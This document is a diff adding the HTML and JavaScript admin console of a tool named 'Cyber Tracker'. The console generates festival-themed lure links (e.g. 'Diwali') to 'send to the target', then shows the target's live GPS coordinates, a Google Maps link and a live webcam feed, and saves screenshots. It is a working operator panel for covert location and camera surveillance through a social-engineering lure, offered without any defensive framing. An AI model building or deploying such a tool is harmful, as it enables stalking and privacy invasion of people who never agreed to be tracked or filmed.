@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cyber Tracker - Admin</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <header>
+        <h1>CYBER TRACKER // ADMIN</h1>
+    </header>
+    <main>
+        <div class="card">
+            <h2>Session Control</h2>
+            <input type="text" id="festival-name" placeholder="Enter Festival Name (e.g. Diwali)">
+            <button id="generate-btn" class="btn">Generate Tracking Link</button>
+            <div id="link-container" class="hidden">
+                <p>Send this link to the target:</p>
+                <input type="text" id="tracking-link" readonly>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>Target Status <span id="status-dot" class="status-indicator"></span></h2>
+            <div class="data-row">
+                <span>Status:</span>
+                <span id="connection-status">Waiting for link generation...</span>
+            </div>
+            <div class="data-row">
+                <span>Location:</span>
+                <span id="location-data">--</span>
+            </div>
+            <div class="data-row">
+                <span>Map:</span>
+                <span id="map-link">--</span>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>Live Feed</h2>
+            <div style="position: relative;">
+                <img id="video-feed" src="" alt="Waiting for stream...">
+            </div>
+            <button id="capture-btn" class="btn" style="margin-top: 10px; background-color: #2ea043;">Capture
+                Screenshot</button>
+            <div id="gallery" style="margin-top: 10px; display: flex; gap: 10px; overflow-x: auto;"></div>
+        </div>
+    </main>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        const generateBtn = document.getElementById('generate-btn');
+        const festivalInput = document.getElementById('festival-name');
+        const linkContainer = document.getElementById('link-container');
+        const trackingLinkInput = document.getElementById('tracking-link');
+        const statusDot = document.getElementById('status-dot');
+        const connectionStatus = document.getElementById('connection-status');
+        const locationData = document.getElementById('location-data');
+        const mapLink = document.getElementById('map-link');
+        const videoFeed = document.getElementById('video-feed');
+        const captureBtn = document.getElementById('capture-btn');
+        const gallery = document.getElementById('gallery');
+
+        let sessionId = null;
+
+        generateBtn.addEventListener('click', () => {
+            const festival = festivalInput.value.trim() || 'Special Event';
+            sessionId = Math.random().toString(36).substring(2, 15);
+            // Encode festival name to handle spaces and special chars
+            const link = `${window.location.origin}/track?session=${sessionId}&festival=${encodeURIComponent(festival)}`;
+
+            trackingLinkInput.value = link;
+            linkContainer.classList.remove('hidden');
+            connectionStatus.innerText = "Waiting for target to connect...";
+
+            socket.emit('join-session', sessionId);
+        });
+
+        captureBtn.addEventListener('click', () => {
+            if (!videoFeed.src || videoFeed.src === window.location.href) return;
+
+            const link = document.createElement('a');
+            link.href = videoFeed.src;
+            link.download = `capture-${Date.now()}.jpg`;
+            // Add to gallery
+            const img = document.createElement('img');
+            img.src = videoFeed.src;
+            img.style.height = '60px';
+            img.style.border = '1px solid #fff';
+            gallery.prepend(img);
+
+            // Trigger download
+            link.click();
+        });
+
+        socket.on('client-status', (status) => {
+            if (status === 'connected') {
+                connectionStatus.innerText = "Target Connected";
+                connectionStatus.style.color = "#2ea043";
+                statusDot.classList.add('active');
+            }
+        });
+
+        socket.on('receive-location', (data) => {
+            const { latitude, longitude } = data;
+            locationData.innerText = `${latitude.toFixed(6)}, ${longitude.toFixed(6)}`;
+            mapLink.innerHTML = `<a href="https://www.google.com/maps?q=${latitude},${longitude}" target="_blank" style="color: var(--accent-color)">Open in Maps</a>`;
+        });
+
+        socket.on('receive-frame', (image) => {
+            videoFeed.src = image;
+        });
+    </script>
+</body>
+
+</html>
